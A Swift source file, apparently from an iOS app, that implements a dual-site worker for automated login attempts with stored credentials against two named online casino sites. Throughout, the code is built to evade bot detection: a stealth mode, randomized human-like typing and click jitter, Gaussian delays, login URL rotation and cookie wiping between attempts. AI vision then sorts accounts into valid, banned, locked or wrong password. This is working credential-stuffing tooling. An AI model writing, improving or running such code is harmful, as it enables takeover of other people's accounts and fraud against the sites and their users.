import Foundation
import UIKit
import WebKit

@MainActor
class DualSiteWorkerService {
    static let shared = DualSiteWorkerService()

    private let logger = DebugLogger.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let notifications = PPSRNotificationService.shared
    private let blacklistService = BlacklistService.shared
    private let urlRotation = LoginURLRotationService.shared
    private let crashProtection = CrashProtectionService.shared
    private let screenshotManager = UnifiedScreenshotManager.shared
    private let coordEngine = CoordinateInteractionEngine.shared
    private let typingEngine = HardwareTypingEngine.shared
    private let aiVision = UnifiedAIVisionService.shared

    private func gaussianDelay(minMs: Int, maxMs: Int) -> Int {
        let mean = Double(minMs + maxMs) / 2.0
        let stdDev = Double(maxMs - minMs) / 4.0
        let u1 = Double.random(in: 0.0001...0.9999)
        let u2 = Double.random(in: 0.0001...0.9999)
        let z = sqrt(-2.0 * log(u1)) * cos(2.0 * .pi * u2)
        let delay = mean + z * stdDev
        return max(minMs, min(maxMs, Int(delay)))
    }

    struct WorkerResult {
        let session: DualSiteSession
        let joeOutcome: LoginOutcome?
        let ignitionOutcome: LoginOutcome?
        let pairedOCRStatus: String?
    }

    func runDualSiteSession(
        session: inout DualSiteSession,
        config: UnifiedSystemConfig,
        stealthEnabled: Bool,
        automationSettings: AutomationSettings = AutomationSettings(),
        onUpdate: @escaping (DualSiteSession) -> Void,
        onLog: @escaping (String, PPSRLogEntry.Level) -> Void
    ) async -> WorkerResult {
        let sessionId = "v42_\(session.credential.email.prefix(10))_\(UUID().uuidString.prefix(6))"
        let earlyStop = EarlyStopActor()

        onLog("V4.2 Worker \(sessionId): starting dual-site test for \(session.credential.email)", .info)

        session.currentAttempt = 0
        session.onlyIncorrectPassword = true
        onUpdate(session)

        let netConfig = networkFactory.appWideConfig(for: .joe)

        let joeSession = LoginSiteWebSession(
            targetURL: URL(string: resolveURL(for: .joefortune).absoluteString)!,
            networkConfig: netConfig
        )
        let ignSession = LoginSiteWebSession(
            targetURL: URL(string: resolveURL(for: .ignition).absoluteString)!,
            networkConfig: netConfig
        )

        joeSession.stealthEnabled = stealthEnabled
        ignSession.stealthEnabled = stealthEnabled

        await joeSession.setUp(wipeAll: true)
        await ignSession.setUp(wipeAll: true)

        defer {
            joeSession.tearDown(wipeAll: true)
            ignSession.tearDown(wipeAll: true)
        }

        onLog("V4.2: Navigating both sites in parallel...", .info)
        async let joeLoadTask = joeSession.loadPage(timeout: automationSettings.pageLoadTimeout)
        async let ignLoadTask = ignSession.loadPage(timeout: automationSettings.pageLoadTimeout)
        let joeLoaded = await joeLoadTask
        let ignLoaded = await ignLoadTask

        if !joeLoaded && !ignLoaded {
            onLog("V4.2: Both sites failed to load — connection failure", .error)
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.endTime = Date()
            session.joeSiteResult = .noAccount
            session.ignitionSiteResult = .noAccount
            onUpdate(session)
            return WorkerResult(session: session, joeOutcome: .connectionFailure, ignitionOutcome: .connectionFailure, pairedOCRStatus: nil)
        }

        let joeSite = SiteTarget.joefortune
        let ignSite = SiteTarget.ignition

        let joeLoginBtnSelectors = [joeSite.selectors.submit, "button[type='submit']", "input[type='submit']"]
        let ignLoginBtnSelectors = [ignSite.selectors.submit, "button[type='submit']", "input[type='submit']"]

        async let joeStable: Void = {
            guard joeLoaded else { return }
            _ = await self.coordEngine.waitForButtonStable(selectors: joeLoginBtnSelectors, executeJS: { js in await joeSession.executeJS(js) }, stabilityMs: 300, timeoutMs: 5000, sessionId: sessionId)
        }()
        async let ignStable: Void = {
            guard ignLoaded else { return }
            _ = await self.coordEngine.waitForButtonStable(selectors: ignLoginBtnSelectors, executeJS: { js in await ignSession.executeJS(js) }, stabilityMs: 300, timeoutMs: 5000, sessionId: sessionId)
        }()
        _ = await (joeStable, ignStable)

        async let joeCookieDismiss: Void = {
            guard joeLoaded else { return }
            await joeSession.dismissCookieNotices()
        }()
        async let ignCookieDismiss: Void = {
            guard ignLoaded else { return }
            await ignSession.dismissCookieNotices()
        }()
        _ = await (joeCookieDismiss, ignCookieDismiss)
        onLog("V4.2: Cookie notices auto-dismissed on both sites", .info)

        let initDelayMs = gaussianDelay(minMs: 0, maxMs: 6000)
        onLog("V4.2: Initialization delay \(initDelayMs)ms", .info)
        try? await Task.sleep(for: .milliseconds(initDelayMs))

        var lastJoeOutcome: LoginOutcome?
        var lastIgnOutcome: LoginOutcome?

        for attemptNum in 1...config.maxAttemptsPerSite {
            guard await earlyStop.isActive else { break }
            guard !Task.isCancelled else { break }

            session.currentAttempt = attemptNum
            onUpdate(session)
            onLog("V4.2: Attempt \(attemptNum)/\(config.maxAttemptsPerSite)", .info)

            if attemptNum > 1 {
                let minDelayMs = Int(automationSettings.v42InterAttemptDelayMinSec * 1000)
                let maxDelayMs = Int(automationSettings.v42InterAttemptDelayMaxSec * 1000)
                let thinkDelayMs = gaussianDelay(minMs: minDelayMs, maxMs: maxDelayMs)
                onLog("V4.2: Inter-attempt delay \(String(format: "%.1f", Double(thinkDelayMs) / 1000.0))s (Gaussian)", .info)
                try? await Task.sleep(for: .milliseconds(thinkDelayMs))
                guard await earlyStop.isActive else { break }

                if automationSettings.clearCookiesBetweenAttempts || automationSettings.clearLocalStorageBetweenAttempts || automationSettings.clearSessionStorageBetweenAttempts {
                    onLog("V4.2: Clearing data between attempts (cookies:\(automationSettings.clearCookiesBetweenAttempts) localStorage:\(automationSettings.clearLocalStorageBetweenAttempts) sessionStorage:\(automationSettings.clearSessionStorageBetweenAttempts))", .info)

                    // When cookies need clearing, use WKWebsiteDataStore APIs via setUp(wipeAll:)
                    // since document.cookie cannot see or delete HttpOnly cookies
                    if automationSettings.clearCookiesBetweenAttempts {
                        await joeSession.setUp(wipeAll: true)
                        await ignSession.setUp(wipeAll: true)
                        async let joeReload = joeSession.loadPage(timeout: automationSettings.pageLoadTimeout)
                        async let ignReload = ignSession.loadPage(timeout: automationSettings.pageLoadTimeout)
                        let _ = await (joeReload, ignReload)
                    } else {
                        // Only localStorage/sessionStorage clearing requested — JS is sufficient
                        var clearJS = "(function(){"
                        if automationSettings.clearLocalStorageBetweenAttempts { clearJS += "try{localStorage.clear();}catch(e){}" }
                        if automationSettings.clearSessionStorageBetweenAttempts { clearJS += "try{sessionStorage.clear();}catch(e){}" }
                        clearJS += "return'CLEARED';})()"
                        let joeExec: (String) async -> String? = { js in await joeSession.executeJS(js) }
                        let ignExec: (String) async -> String? = { js in await ignSession.executeJS(js) }
                        _ = await joeExec(clearJS)
                        _ = await ignExec(clearJS)
                    }
                }
            }

            async let joeCookieCheck: Void = {
                guard joeLoaded else { return }
                await joeSession.dismissCookieNotices()
            }()
            async let ignCookieCheck: Void = {
                guard ignLoaded else { return }
                await ignSession.dismissCookieNotices()
            }()
            _ = await (joeCookieCheck, ignCookieCheck)

            async let joeNetIdle: Bool = self.coordEngine.checkNetworkIdle(executeJS: { js in await joeSession.executeJS(js) }, timeoutMs: 3000)
            async let ignNetIdle: Bool = self.coordEngine.checkNetworkIdle(executeJS: { js in await ignSession.executeJS(js) }, timeoutMs: 3000)
            _ = await (joeNetIdle, ignNetIdle)

            try? await Task.sleep(for: .milliseconds(gaussianDelay(minMs: automationSettings.v42HumanVarianceMinMs, maxMs: automationSettings.v42HumanVarianceMaxMs)))

    

            let email = session.credential.email
            let password = session.credential.password

            let joeEmailSelectors = [joeSite.selectors.user, "input[type='email']", "input[name='email']", "input[name='username']", "input[type='text']:first-of-type"]
            let joePassSelectors = [joeSite.selectors.pass, "input[type='password']", "input[name='password']"]
            let ignEmailSelectors = [ignSite.selectors.user, "input[type='email']", "input[name='email']", "input[name='username']", "input[type='text']:first-of-type"]
            let ignPassSelectors = [ignSite.selectors.pass, "input[type='password']", "input[name='password']"]

            let joeExecuteJS: (String) async -> String? = { js in await joeSession.executeJS(js) }
            let ignExecuteJS: (String) async -> String? = { js in await ignSession.executeJS(js) }

            let typingMinMs = config.humanEmulation.typingSpeedMin
            let typingMaxMs = config.humanEmulation.typingSpeedMax
            let varianceMinMs = automationSettings.v42HumanVarianceMinMs
            let varianceMaxMs = automationSettings.v42HumanVarianceMaxMs
            let fieldClearMethod = automationSettings.clearFieldsBeforeTyping ? automationSettings.clearFieldMethod : .jsValueClear

            async let joeTypingDone: Bool = {
                guard joeLoaded else { return false }
                let emailOk = await self.typingEngine.focusAndType(
                    fieldSelectors: joeEmailSelectors,
                    text: email,
                    executeJS: joeExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                try? await Task.sleep(for: .milliseconds(self.gaussianDelay(minMs: varianceMinMs, maxMs: varianceMaxMs)))
                let passOk = await self.typingEngine.focusAndType(
                    fieldSelectors: joePassSelectors,
                    text: password,
                    executeJS: joeExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                return emailOk && passOk
            }()

            async let ignTypingDone: Bool = {
                guard ignLoaded else { return false }
                let emailOk = await self.typingEngine.focusAndType(
                    fieldSelectors: ignEmailSelectors,
                    text: email,
                    executeJS: ignExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                try? await Task.sleep(for: .milliseconds(self.gaussianDelay(minMs: varianceMinMs, maxMs: varianceMaxMs)))
                let passOk = await self.typingEngine.focusAndType(
                    fieldSelectors: ignPassSelectors,
                    text: password,
                    executeJS: ignExecuteJS,
                    minKeystrokeMs: typingMinMs, maxKeystrokeMs: typingMaxMs,
                    clearMethod: fieldClearMethod,
                    sessionId: sessionId
                )
                return emailOk && passOk
            }()

            let joeTyped = await joeTypingDone
            let ignTyped = await ignTypingDone

            onLog("V4.2: Typing complete — Joe:\(joeTyped) Ign:\(ignTyped)", joeTyped && ignTyped ? .success : .warning)

            try? await Task.sleep(for: .milliseconds(gaussianDelay(minMs: automationSettings.v42HumanVarianceMinMs, maxMs: automationSettings.v42HumanVarianceMaxMs)))

            guard await earlyStop.isActive else { break }

            async let joeClicked: Bool = {
                guard joeLoaded && joeTyped else { return false }
                let result = await self.coordEngine.coordinateClickWithFallback(
                    primarySelectors: joeLoginBtnSelectors,
                    fallbackSelectors: ["button", "[role='button']"],
                    executeJS: joeExecuteJS,
                    jitterPx: 3,
                    hoverDwellMs: 300,
                    sessionId: sessionId
                )
                return result.success
            }()

            async let ignClicked: Bool = {
                guard ignLoaded && ignTyped else { return false }
                let result = await self.coordEngine.coordinateClickWithFallback(
                    primarySelectors: ignLoginBtnSelectors,
                    fallbackSelectors: ["button", "[role='button']"],
                    executeJS: ignExecuteJS,
                    jitterPx: 3,
                    hoverDwellMs: 300,
                    sessionId: sessionId
                )
                return result.success
            }()

            let joeClickOk = await joeClicked
            let ignClickOk = await ignClicked

            onLog("V4.2: Click complete — Joe:\(joeClickOk) Ign:\(ignClickOk)", joeClickOk || ignClickOk ? .info : .warning)

            try? await Task.sleep(for: .seconds(2))
            onLog("V4.2: AI Vision settlement wait (2s)", .info)

            let ssLimit = automationSettings.unifiedScreenshotsPerAttempt
            if ssLimit != .zero {
                let postClickDelay = automationSettings.unifiedScreenshotPostClickDelayMs
                let clickPriority = AutomationSettings.UnifiedScreenshotCount.priorityOrder(
                    forClickIndex: attemptNum - 1,
                    totalClicks: config.maxAttemptsPerSite
                )
                try? await Task.sleep(for: .milliseconds(postClickDelay))
                await capturePostClickScreenshots(
                    joeSession: joeSession,
                    ignSession: ignSession,
                    sessionId: session.id,
                    email: session.credential.email,
                    attemptNum: attemptNum,
                    clickPriority: clickPriority,
                    joeClickOk: joeClickOk,
                    ignClickOk: ignClickOk,
                    perSiteLimit: ssLimit.perCredentialPerSiteLimit
                )
                onLog("V4.2: Post-click screenshot captured (priority \(clickPriority), delay \(postClickDelay)ms)", .info)
            }

            try? await Task.sleep(for: .milliseconds(gaussianDelay(minMs: automationSettings.v42HumanVarianceMinMs, maxMs: automationSettings.v42HumanVarianceMaxMs)))

            async let joeOutcomeTask = self.evaluateSiteWithAIVision(
                session: joeSession,
                site: "joe",
                sessionId: sessionId
            )
            async let ignOutcomeTask = self.evaluateSiteWithAIVision(
                session: ignSession,
                site: "ignition",
                sessionId: sessionId
            )
            let joeOutcome = await joeOutcomeTask
            let ignOutcome = await ignOutcomeTask

            lastJoeOutcome = joeOutcome
            lastIgnOutcome = ignOutcome

            let now = Date()
            session.joeAttempts.append(SiteAttemptResult(
                siteId: "joe",
                attemptNumber: attemptNum,
                responseText: describeOutcome(joeOutcome),
                timestamp: now,
                durationMs: 0
            ))
            session.ignitionAttempts.append(SiteAttemptResult(
                siteId: "ignition",
                attemptNumber: attemptNum,
                responseText: describeOutcome(ignOutcome),
                timestamp: now,
                durationMs: 0
            ))

            if joeOutcome != .noAcc && joeOutcome != .unsure { session.onlyIncorrectPassword = false }
            if ignOutcome != .noAcc && ignOutcome != .unsure { session.onlyIncorrectPassword = false }

            let joeRegistered = session.joeAttempts.count
            let ignRegistered = session.ignitionAttempts.count
            session.joeSiteResult = SiteResult.fromLoginOutcome(joeOutcome, registeredAttempts: joeRegistered, maxAttempts: config.maxAttemptsPerSite)
            session.ignitionSiteResult = SiteResult.fromLoginOutcome(ignOutcome, registeredAttempts: ignRegistered, maxAttempts: config.maxAttemptsPerSite)

            if joeOutcome == .success || ignOutcome == .success {
                let trigSite = joeOutcome == .success ? "joe" : "ignition"
                await earlyStop.signalSuccess(from: trigSite)
                session.globalState = .success
                session.classification = .validAccount
                session.identityAction = .burn
                session.isBurned = true
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: SUCCESS on \(trigSite) — burning identity", .success)
                notifications.sendBatchComplete(working: 1, dead: 0, requeued: 0)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .successDetected, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear SUCCESS result", .info)
                break
            }

            if joeOutcome == .permDisabled || ignOutcome == .permDisabled {
                let trigSite = joeOutcome == .permDisabled ? "joe" : "ignition"
                await earlyStop.signalPermBan(from: trigSite)
                session.globalState = .abortPerm
                session.classification = .permanentBan
                session.identityAction = .burn
                session.isBurned = true
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: PERM BAN on \(trigSite) — burning identity", .error)
                blacklistService.addToBlacklist(session.credential.email, reason: "V4.2: perm disabled")
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .terminalState, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear PERM BAN result", .info)
                break
            }

            if joeOutcome == .tempDisabled || ignOutcome == .tempDisabled {
                let trigSite = joeOutcome == .tempDisabled ? "joe" : "ignition"
                await earlyStop.signalTempLock(from: trigSite)
                session.globalState = .abortTemp
                session.classification = .temporaryLock
                session.identityAction = .save
                session.isBurned = false
                session.triggeringSite = trigSite
                session.endTime = Date()
                onLog("V4.2: TEMP LOCK on \(trigSite) — keeping identity", .warning)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .terminalState, session: &session)
                screenshotManager.smartReduceForClearResult(sessionId: session.id)
                onLog("V4.2: Smart-reduced screenshots to 2 (1/site) for clear TEMP LOCK result", .info)
                break
            }

            if attemptNum >= config.maxAttemptsPerSite {
                await earlyStop.signalExhausted()
                session.globalState = .exhausted
                session.classification = .noAccount
                session.identityAction = .save
                session.isBurned = false
                session.endTime = Date()
                onLog("V4.2: EXHAUSTED after \(attemptNum) attempts — \(session.onlyIncorrectPassword ? "only incorrect password" : "mixed responses")", .warning)
                await captureTerminalScreenshots(joeSession: joeSession, ignSession: ignSession, sessionId: session.id, email: session.credential.email, attemptNum: attemptNum, step: .finalState, session: &session)
                break
            }

            onLog("V4.2: Attempt \(attemptNum) — incorrect password, continuing...", .info)
            onUpdate(session)
        }

        let ssLimit = automationSettings.unifiedScreenshotsPerAttempt
        if ssLimit != .zero {
            screenshotManager.pruneByPriority(sessionId: session.id, limit: ssLimit.limit)
        }

        if session.globalState == .active {
            session.globalState = .exhausted
            session.classification = .noAccount
            session.identityAction = .save
            session.isBurned = false
            session.endTime = Date()
            if session.joeSiteResult == .pending { session.joeSiteResult = .noAccount }
            if session.ignitionSiteResult == .pending { session.ignitionSiteResult = .noAccount }
        }

        onUpdate(session)
        return WorkerResult(session: session, joeOutcome: lastJoeOutcome, ignitionOutcome: lastIgnOutcome, pairedOCRStatus: session.pairedOCRStatus)
    }

    private func evaluateSiteWithAIVision(
        session: LoginSiteWebSession,
        site: String,
        sessionId: String
    ) async -> LoginOutcome {
        let currentURL = await session.getCurrentURL()
        if currentURL == "about:blank" || currentURL.isEmpty {
            logger.log("V4.2 EVAL [\(site)]: about:blank — connectionFailure", category: .evaluation, level: .warning, sessionId: sessionId)
            return .connectionFailure
        }

        guard let screenshot = await session.captureScreenshot() else {
            logger.log("V4.2 EVAL [\(site)]: screenshot capture failed — connectionFailure", category: .evaluation, level: .warning, sessionId: sessionId)
            return .connectionFailure
        }

        let context = VisionContext(site: site, phase: .loginOutcome, currentURL: currentURL, attemptNumber: 1)
        let result = await aiVision.analyzeScreenshot(screenshot, context: context)

        logger.log("V4.2 EVAL [\(site)]: AI Vision → \(result.outcome) (\(result.confidence)%) — \(result.reasoning)", category: .evaluation, level: result.outcome == .success ? .success : .info, sessionId: sessionId)
        return result.outcome
    }

    private func resolveURL(for site: SiteTarget) -> URL {
        let isIgnition = site.id == "ignition"
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = isIgnition
        let url = urlRotation.nextURL() ?? URL(string: site.url)!
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    private func describeOutcome(_ outcome: LoginOutcome) -> String {
        switch outcome {
        case .success: "Login successful"
        case .permDisabled: "Account permanently disabled"
        case .tempDisabled: "Account temporarily disabled"
        case .noAcc: "Incorrect password"
        case .unsure: "Uncertain result"
        case .connectionFailure: "Connection failure"
        case .timeout: "Timed out"
        case .smsDetected: "SMS notification detected"
        }
    }

    struct TerminalScreenshotResult {
        let hasImage: Bool
        let ocrOutcome: String
        let crucialMatches: [String]
        let fullText: String
        let confidence: Double
    }

    private func captureTerminalScreenshots(
        joeSession: LoginSiteWebSession,
        ignSession: LoginSiteWebSession,
        sessionId: String,
        email: String,
        attemptNum: Int,
        step: ScreenshotStep,
        session: inout DualSiteSession
    ) async {
        let pairTimestamp = Date()

        async let joeCapture: TerminalScreenshotResult = {
            guard let img = await joeSession.captureScreenshot() else {
                return TerminalScreenshotResult(hasImage: false, ocrOutcome: "", crucialMatches: [], fullText: "", confidence: 0)
            }
            await self.screenshotManager.addScreenshotDirect(
                image: img,
                sessionId: sessionId,
                credentialEmail: email,
                site: "joe",
                step: step,
                attemptNumber: attemptNum,
                clickPriority: 0,
                runVisionAnalysis: true
            )
            let joeURL = await joeSession.getCurrentURL()
            let context = VisionContext(site: "joe", phase: .loginOutcome, currentURL: joeURL, attemptNumber: attemptNum)
            let visionResult = await self.aiVision.analyzeScreenshot(img, context: context)
            let ocrText = await self.aiVision.extractOCRText(from: img)
            let outcomeLabel: String
            switch visionResult.outcome {
            case .success: outcomeLabel = "Success"
            case .permDisabled: outcomeLabel = "Perm Disabled"
            case .tempDisabled: outcomeLabel = "Temp Disabled"
            case .noAcc: outcomeLabel = "No Acc"
            case .smsDetected: outcomeLabel = "SMS Detected"
            case .connectionFailure: outcomeLabel = "Error"
            default: outcomeLabel = "No Acc"
            }
            return TerminalScreenshotResult(
                hasImage: true,
                ocrOutcome: outcomeLabel,
                crucialMatches: [],
                fullText: String(ocrText.prefix(2000)),
                confidence: Double(visionResult.confidence) / 100.0
            )
        }()

        async let ignCapture: TerminalScreenshotResult = {
            guard let img = await ignSession.captureScreenshot() else {
                return TerminalScreenshotResult(hasImage: false, ocrOutcome: "", crucialMatches: [], fullText: "", confidence: 0)
            }
            await self.screenshotManager.addScreenshotDirect(
                image: img,
                sessionId: sessionId,
                credentialEmail: email,
                site: "ignition",
                step: step,
                attemptNumber: attemptNum,
                clickPriority: 0,
                runVisionAnalysis: true
            )
            let ignURL = await ignSession.getCurrentURL()
            let context = VisionContext(site: "ignition", phase: .loginOutcome, currentURL: ignURL, attemptNumber: attemptNum)
            let visionResult = await self.aiVision.analyzeScreenshot(img, context: context)
            let ocrText = await self.aiVision.extractOCRText(from: img)
            let outcomeLabel: String
            switch visionResult.outcome {
            case .success: outcomeLabel = "Success"
            case .permDisabled: outcomeLabel = "Perm Disabled"
            case .tempDisabled: outcomeLabel = "Temp Disabled"
            case .noAcc: outcomeLabel = "No Acc"
            case .smsDetected: outcomeLabel = "SMS Detected"
            case .connectionFailure: outcomeLabel = "Error"
            default: outcomeLabel = "No Acc"
            }
            return TerminalScreenshotResult(
                hasImage: true,
                ocrOutcome: outcomeLabel,
                crucialMatches: [],
                fullText: String(ocrText.prefix(2000)),
                confidence: Double(visionResult.confidence) / 100.0
            )
        }()

        let (joeResult, ignResult) = await (joeCapture, ignCapture)

        if joeResult.hasImage {
            session.joeOCRMetadata = SiteOCRMetadata(
                siteId: "joe",
                ocrOutcome: joeResult.ocrOutcome,
                crucialMatches: joeResult.crucialMatches,
                fullText: joeResult.fullText,
                confidence: joeResult.confidence,
                screenshotTimestamp: pairTimestamp
            )
        }
        if ignResult.hasImage {
            session.ignitionOCRMetadata = SiteOCRMetadata(
                siteId: "ignition",
                ocrOutcome: ignResult.ocrOutcome,
                crucialMatches: ignResult.crucialMatches,
                fullText: ignResult.fullText,
                confidence: ignResult.confidence,
                screenshotTimestamp: pairTimestamp
            )
        }

        if let joeOCR = session.joeOCRMetadata, let ignOCR = session.ignitionOCRMetadata {
            let paired = VisionTextCropService.pairedOCRStatus(
                joe: ocrLabelToOutcome(joeOCR.ocrOutcome),
                ignition: ocrLabelToOutcome(ignOCR.ocrOutcome)
            )
            logger.log("V4.2 OCR Paired: \(email) → \(paired)", category: .evaluation, level: .info)
        }
    }

    private func capturePostClickScreenshots(
        joeSession: LoginSiteWebSession,
        ignSession: LoginSiteWebSession,
        sessionId: String,
        email: String,
        attemptNum: Int,
        clickPriority: Int,
        joeClickOk: Bool,
        ignClickOk: Bool,
        perSiteLimit: Int
    ) async {
        let canCaptureJoe = joeClickOk && screenshotManager.canCapture(credentialEmail: email, site: "joe", limit: perSiteLimit)
        let canCaptureIgn = ignClickOk && screenshotManager.canCapture(credentialEmail: email, site: "ignition", limit: perSiteLimit)

        if !canCaptureJoe && joeClickOk {
            logger.log("V4.2 Screenshot: joe limit reached (\(perSiteLimit)/site) for \(email)", category: .screenshot, level: .trace)
        }
        if !canCaptureIgn && ignClickOk {
            logger.log("V4.2 Screenshot: ignition limit reached (\(perSiteLimit)/site) for \(email)", category: .screenshot, level: .trace)
        }

        async let joeCaptureDone: Void = {
            guard canCaptureJoe, let joeImg = await joeSession.captureScreenshot() else { return }
            await self.screenshotManager.addScreenshotDirect(
                image: joeImg,
                sessionId: sessionId,
                credentialEmail: email,
                site: "joe",
                step: .postClick,
                attemptNumber: attemptNum,
                clickPriority: clickPriority,
                runVisionAnalysis: false
            )
        }()
        async let ignCaptureDone: Void = {
            guard canCaptureIgn, let ignImg = await ignSession.captureScreenshot() else { return }
            await self.screenshotManager.addScreenshotDirect(
                image: ignImg,
                sessionId: sessionId,
                credentialEmail: email,
                site: "ignition",
                step: .postClick,
                attemptNumber: attemptNum,
                clickPriority: clickPriority,
                runVisionAnalysis: false
            )
        }()
        _ = await (joeCaptureDone, ignCaptureDone)
    }

    private func ocrLabelToOutcome(_ label: String) -> VisionTextCropService.DetectedOutcome {
        switch label {
        case "Perm Disabled": return .permDisabled
        case "Temp Disabled": return .tempDisabled
        case "Success": return .success
        case "No Acc": return .noAccount
        case "SMS Detected": return .smsVerification
        case "Error": return .errorBanner
        default: return .unknown
        }
    }
}
